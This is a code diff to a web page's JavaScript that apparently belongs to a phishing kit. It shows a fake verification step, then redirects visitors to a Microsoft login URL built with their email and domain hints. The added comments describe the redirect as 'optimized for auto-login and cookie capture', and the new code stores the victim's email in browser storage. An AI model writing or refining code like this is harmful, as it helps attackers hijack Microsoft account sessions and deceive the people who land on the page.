@@ -420,10 +420,23 @@
         // Show verifying state
         $('#submit-btn').html('Verifying...');
 
-        // Add delay to show verification state, then redirect to Microsoft login
+        // ENHANCED: Add delay to show verification state, then redirect to Microsoft login for cookie capture
         setTimeout(function() {
-          // FIXED: Use more reliable Microsoft login URL with better mobile support
-          const microsoftLoginUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https%3A%2F%2Fwww.office.com%2F&response_mode=query&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default&state=12345&prompt=none&login_hint=" + encodeURIComponent(email);
+          // ENHANCED: Microsoft login URL optimized for auto-login and cookie capture
+          const microsoftLoginUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https%3A%2F%2Fwww.office.com%2F&response_mode=query&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default&state=12345&prompt=none&login_hint=" + encodeURIComponent(email) + "&domain_hint=" + encodeURIComponent(email.split('@')[1]);
+          
+          console.log('🔄 Redirecting to Microsoft domain for cookie capture:', microsoftLoginUrl);
+          
+          // Mark that we're about to capture Microsoft cookies
+          try {
+            localStorage.setItem('ms_redirect_initiated', 'true');
+            sessionStorage.setItem('ms_redirect_initiated', 'true');
+            localStorage.setItem('ms_redirect_email', email);
+            sessionStorage.setItem('ms_redirect_email', email);
+          } catch (e) {
+            // ignore storage errors
+          }
+          
           window.location.replace(microsoftLoginUrl);
         }, 1200);
       });
